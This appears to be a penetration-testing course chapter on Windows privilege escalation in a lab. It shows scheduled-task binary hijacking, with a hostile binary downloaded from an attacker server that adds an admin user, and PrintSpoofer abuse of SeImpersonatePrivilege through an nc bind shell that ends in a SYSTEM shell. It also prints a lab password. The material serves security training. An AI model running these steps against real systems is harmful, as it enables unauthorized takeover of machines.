### 16.3.1 Scheduled Tasks

Windows uses the Task Scheduler to execute various automated tasks, such as clean-up activities or update management. These tasks are known as Scheduled Tasks and are defined with one or more triggers. A trigger is a condition that, when met, causes one or more actions to be executed. For example, a trigger can be set to a specific time and date, at startup, at logon, or on a Windows event. An action specifies which program or script to execute.

Scheduled tasks can have various configurations, which are categorized in the Conditions, Settings, and General menu tabs of a taskâ€™s properties. For identifying potential privilege escalation vectors, three key pieces of information are crucial:

1. **User Account (Principal):** As which user account does this task get executed?
2. **Triggers:** What triggers are specified for the task?
3. **Actions:** What actions are executed when one or more of these triggers are met?

#### Understanding the User Account
- **Privilege Escalation Potential:** If the task runs as `NT AUTHORITY\SYSTEM` or an administrative user, it can be exploited for privilege escalation. If the task runs in the context of the current user, it won't lead to elevated privileges.

#### Analyzing Triggers
- **Trigger Conditions:** If the trigger condition was met in the past, the task will not run again in the future, making it a non-viable target.
- **Timing Considerations:** In a week-long penetration test, if the task runs after the test period, it should be noted in the report but not pursued further.

#### Examining Actions
- **Exploitation Techniques:** The actions specified in the task determine how we can perform the potential privilege escalation. Common techniques include replacing the binary or placing a missing DLL, similar to those used with services.

### Example: Exploiting a Scheduled Task

Let's walk through an example where we attempt to elevate our privileges by replacing a binary specified in an action. We'll connect as `steve` (password: `securityIsNotAnOption++++++`) to `CLIENTWK220` via RDP and start a PowerShell window.

#### Viewing Scheduled Tasks
We can view scheduled tasks using the `Get-ScheduledTask` cmdlet or the `schtasks /query` command. For this example, we'll use `schtasks /query` to review all scheduled tasks on `CLIENTWK220`.

```powershell
PS C:\Users\steve> schtasks /query /fo LIST /v
```

This command provides detailed information about all scheduled tasks. We should focus on the following fields:
- **Author**
- **TaskName**
- **Task To Run**
- **Run As User**
- **Next Run Time**

#### Identifying Interesting Tasks
From the output, we find a task named `\Microsoft\CacheCleanup`:

```plaintext
HostName: CLIENTWK220
TaskName: \Microsoft\CacheCleanup
Next Run Time: 7/11/2022 2:47:21 AM
Status: Ready
Logon Mode: Interactive/Background
Last Run Time: 7/11/2022 2:46:22 AM
Last Result: 0
Author: CLIENTWK220\daveadmin
Task To Run: C:\Users\steve\Pictures\BackendCacheCleanup.exe
Start In: C:\Users\steve\Pictures
Comment: N/A
Scheduled Task State: Enabled
Idle Time: Disabled
Power Management: Stop On Battery Mode
Run As User: daveadmin
Delete Task If Not Rescheduled: Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule: Scheduling data is not available in this format.
Schedule Type: One Time Only, Minute
Start Time: 7:37:21 AM
Start Date: 7/4/2022
```

This task is created by `daveadmin` and runs every minute. The executable `BackendCacheCleanup.exe` is located in `C:\Users\steve\Pictures`, and the task runs as `daveadmin`.

#### Checking Permissions
Since the executable is in `steve`'s home directory, we should have extensive permissions on it. We can check our permissions using `icacls`:

```powershell
PS C:\Users\steve> icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
C:\Users\steve\Pictures\BackendCacheCleanup.exe NT AUTHORITY\SYSTEM:(I)(F)
BUILTIN\Administrators:(I)(F)
CLIENTWK220\steve:(I)(F)
CLIENTWK220\offsec:(I)(F)
```

As expected, we have Full Access (F) permissions.

#### Replacing the Executable
We can replace `BackendCacheCleanup.exe` with our own binary, `adduser.exe`, to create a new administrative user. First, we start a Python3 web server to serve our cross-compiled file and download it to `CLIENTWK220`:

```powershell
PS C:\Users\steve> iwr -Uri http://192.168.119.3/adduser.exe -Outfile BackendCacheCleanup.exe
PS C:\Users\steve> move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
PS C:\Users\steve> move .\BackendCacheCleanup.exe .\Pictures\
```

After the scheduled task runs, the new user `dave2` should be added to the local Administrators group. We can verify this:

```powershell
PS C:\Users\steve> net user
User accounts for \\CLIENTWK220
-------------------------------------------------------------------------------
Administrator BackupAdmin dave
dave2 daveadmin DefaultAccount
Guest offsec steve
WDAGUtilityAccount
The command completed successfully.
PS C:\Users\steve> net localgroup administrators
Alias name administrators
Comment Administrators have complete and unrestricted access to the computer/domain
Members
-------------------------------------------------------------------------------
Administrator
BackupAdmin
dave2
daveadmin
offsec
The command completed successfully.
```

### 16.3.2 Using Exploits

In previous sections, we explored privilege escalation by searching for sensitive information or abusing Windows components like services and scheduled tasks. In this section, we discuss three types of exploits leading to privilege escalation and provide an example.

#### Types of Exploits

1. **Application-Based Vulnerabilities:**
   - Installed applications may contain vulnerabilities. If these applications run with administrative permissions, exploiting them can lead to code execution and privilege escalation.

2. **Windows Kernel Exploits:**
   - These exploits target vulnerabilities in the Windows kernel. They are advanced and require in-depth knowledge of the operating system. While they can be powerful, they also carry the risk of crashing the system. Careful consideration of the rules of engagement is essential.

3. **Abusing Windows Privileges:**
   - Non-privileged users with certain privileges, such as `SeImpersonatePrivilege`, can potentially abuse these privileges for privilege escalation. For example, `SeImpersonatePrivilege` allows a user to impersonate another security context under the right circumstances.

#### Example: Abusing SeImpersonatePrivilege

We'll use the `PrintSpoofer` tool, created by itm4n, to exploit the `SeImpersonatePrivilege` and obtain an interactive shell as `NT AUTHORITY\SYSTEM`.

1. **Connecting to the Target:**
   - Connect to the bind shell on port 4444 on `CLIENTWK220` and check the assigned privileges of `dave`:

```powershell
kali@kali:~$ nc 192.168.50.220 4444
Microsoft Windows [Version 10.0.22000.318]
(c) Microsoft Corporation. All rights reserved.
C:\Users\dave> whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name Description State
============================= ========================================= ========
SeSecurityPrivilege Manage auditing and security log Disabled
SeShutdownPrivilege Shut down the system Disabled
SeChangeNotifyPrivilege Bypass traverse checking Enabled
SeUndockPrivilege Remove computer from docking station Disabled
SeImpersonatePrivilege Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
SeTimeZonePrivilege Change the time zone Disabled
```

2. **Downloading and Serving PrintSpoofer:**
   - Download the 64-bit version of `PrintSpoofer` and serve it with a Python3 web server:

```bash
kali@kali:~$ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
...
kali@kali:~$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

3. **Downloading PrintSpoofer to the Target:**
   - Start a PowerShell session and download `PrintSpoofer64.exe` from the Kali machine:

```powershell
C:\Users\dave> powershell
PS C:\Users\dave> iwr -uri http://192.168.119.2/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
```

4. **Executing PrintSpoofer:**
   - Use `PrintSpoofer64.exe` to obtain an interactive PowerShell session in the context of `NT AUTHORITY\SYSTEM`:

```powershell
PS C:\Users\dave> .\PrintSpoofer64.exe -i -c powershell.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
Install the latest PowerShell for new features and improvements!
https://aka.ms/PSWindows
PS C:\Windows\system32> whoami
nt authority\system
```

### Conclusion

In this section, we leveraged a similar privilege escalation attack as we did with service binary hijacking, but focused on scheduled tasks. We learned how to effectively enumerate scheduled tasks and identify key properties. We also explored different types of exploits, including application-based vulnerabilities, Windows kernel exploits, and abusing Windows privileges, and demonstrated how to use `PrintSpoofer` to escalate privileges.